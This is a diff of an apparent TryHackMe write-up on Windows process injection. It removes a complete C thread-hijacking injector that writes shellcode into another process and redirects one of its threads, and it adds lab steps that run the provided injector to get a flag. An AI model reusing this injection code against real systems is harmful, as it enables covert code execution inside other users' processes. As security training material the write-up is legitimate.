@@ -126,47 +126,7 @@ PS C:\Users\THM-Attacker> cd .\Desktop\Injectors\
 ## Abusing Process Components
 
 1. Started up this task's machine
-```C
-#include <windows.h>
-#include <dbghelp.h>
-#include <tlhelp32.h>
-#include <stdio.h>
-
-unsigned char shellcode[] = "";
-
-int main(int argc, char *argv[]) {
-    HANDLE h_thread;
-    THREADENTRY32 threadEntry;
-    CONTEXT context;
-    context.ContextFlags = CONTEXT_FULL;
-    threadEntry.dwSize = sizeof(THREADENTRY32);
-
-    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
-    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
-
-    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-	Thread32First(h_snapshot, &threadEntry);
-
-	while (Thread32Next(h_snapshot, &threadEntry))
-	{
-		if (threadEntry.th32OwnerProcessID == (atoi(argv[1])))
-		{
-			h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
-			break;
-		}
-	}
-
-    SuspendThread(h_thread);
-
-    GetThreadContext(h_thread, &context);
-	context.Rip = (DWORD_PTR)b_shellcode;
-	SetThreadContext(h_thread, &context);
-	
-	ResumeThread(h_thread);
-
-}
-```
+2. `Get-Process` from the Windows machine to display all of the processes that are currently running on this machine
 ```PowerShell
 PS C:\Users\THM-Attacker> Get-Process
 
@@ -244,9 +204,22 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
     183      11     2704       8940              4332   0 WmiPrvSE
 ```
 
+3. `cd <EXPLOIT DIRECTORY>` from the Windows machine to change into the directory containing our thread injector script that was provided to us with this machine
+```PowerShell
+PS C:\Users\THM-Attacker> cd .\Desktop\Injectors\
+```
+
+4. `.\<EXPLOIT> <PID>` from the Windows machine to execute the provided thread injector script by providing it with a PID of a process that's running under the current user that we're currently running as, which ended up displaying us this task's flag
+
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Process%20Components%20pt1.png)
+
+
+**TASK COMPLETED!**
 
 ## Abusing DLLs
 
+1. Started this task's machine
+2. 2. 
 ```C
 #include <windows.h>
 #include <stdio.h>
